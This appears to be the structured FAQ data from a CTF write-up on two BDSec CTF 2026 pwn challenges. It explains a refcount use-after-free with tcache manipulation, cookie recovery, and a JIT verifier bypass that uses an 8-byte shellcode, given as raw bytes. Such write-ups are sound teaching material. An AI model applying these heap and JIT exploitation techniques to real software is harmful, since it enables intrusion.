  "@type": "FAQPage",
  "mainEntity": [
    {"@type": "Question","name": "What is BDSec CTF 2026?","acceptedAnswer": {"@type": "Answer","text": "BDSec CTF 2026 is a Bangladesh-hosted Capture-the-Flag competition with challenges across reverse engineering, pwn, and web categories. Flags use the BDSEC{...} namespace (some web challenges use lowercase bdsec{...}). This writeup covers the two pwn challenges I solved: Phantom Device (100 pts) and Muktir Shongket (100 pts). Per-challenge READMEs and solver scripts at github.com/Abdelkad3r/BDSecCTF-2026."}},
    {"@type": "Question","name": "What's the use-after-free primitive in Phantom Device?","acceptedAnswer": {"@type": "Answer","text": "Duplicate-handle copies a device descriptor into a free slot but does not increment the underlying device object's refcount. Release-handle uses the refcount to decide whether to free the object. Because the count was never bumped at duplicate time, releasing either descriptor drops the count from 1 to 0 and frees the chunk while the other descriptor still passes the active/type gates. That other descriptor is now a stale read/write handle over the freed chunk."}},
    {"@type": "Question","name": "Why do you need to fill the tcache before overlapping the device with a session?","acceptedAnswer": {"@type": "Answer","text": "On modern glibc (2.28+), calloc does not consult the tcache — it takes a separate allocator path to guarantee zero-initialised memory. If you free a chunk and then call calloc(1, 0x100), calloc misses the tcache bin containing your freed chunk. Filling the 0x110 tcache bin with seven prior allocations means the freshly-freed target chunk cannot go into tcache; it drops onto the fastbin/unsorted path that calloc does consult, and the next session calloc reuses it."}},
    {"@type": "Question","name": "How do you recover the process cookie from checksum1?","acceptedAnswer": {"@type": "Answer","text": "The cookie is loaded once from /dev/urandom and combined into checksum1 = rol64(uid ^ cookie, 17) ^ nonce ^ 0xa55aa55aa55aa55a. Because XOR is self-inverse and rol is invertible with ror, you can solve for cookie given checksum1, uid, and nonce: cookie = ror64(checksum1 ^ nonce ^ 0xa55aa55aa55aa55a, 17) ^ uid. All three inputs are leaked by the initial device read across the session overlap."}},
    {"@type": "Question","name": "Why does ROUTE bypass verification in Muktir Shongket?","acceptedAnswer": {"@type": "Answer","text": "The verifier is a linear walk. For ROUTE it only checks that the sign-extended target lies inside the transmission, then walks past at i + 2 and continues verifying the next order. It never follows the route. The executor, on the other hand, translates ROUTE x into e9 <sign-extended x rel32> — an unconditional x86 jmp. So the executor's control flow visits code paths the verifier's walk skipped, and any bytes in a SIGNAL literal (which the verifier treats as opaque data) can be turned into instructions by landing a ROUTE in the middle of them."}},
    {"@type": "Question","name": "How does the 8-byte SIGNAL literal encode call flag_printer?","acceptedAnswer": {"@type": "Answer","text": "The bytes b8 b0 1b 40 00 ff d0 c3 decode as x86-64 mov eax, 0x401bb0; call rax; ret. 0x401bb0 is the fixed address of the binary's internal flag.txt-printing helper — non-PIE means that address is stable. The whole hidden shellcode fits in exactly 8 bytes, which is exactly what one SIGNAL literal holds, so no chaining is required. ROUTE +2 lands us on the first byte of the literal; the three-instruction sequence returns cleanly from the JIT page."}},
    {"@type": "Question","name": "Why is calling 0x401bb0 enough — don't you need to bypass a sandbox?","acceptedAnswer": {"@type": "Answer","text": "There is no sandbox on this binary. The internal helper 0x401bb0 opens flag.txt and writes its contents to stdout with no additional checks. The privileged-broadcast check (FREEDOM) is enforced at the verifier, not at the helper — and by design, the verifier is the only barrier to running that helper. Once we reach 0x401bb0 from the JIT page, no further work is needed."}},
    {"@type": "Question","name": "Where can I find the solver scripts?","acceptedAnswer": {"@type": "Answer","text": "Per-challenge READMEs, handouts, and solver scripts at github.com/Abdelkad3r/BDSecCTF-2026. Both solvers are Python + pwntools and reproducible against the shipped binaries or the remote target. Phantom Device's solver handles tcache fill, the duplicate/release sequencing, the leak parse, cookie recovery, and session forgery end-to-end. Muktir Shongket's solver uploads the 12-byte payload, verifies, executes, and reads the flag — four menu interactions total."}}
  ]
}
</script>
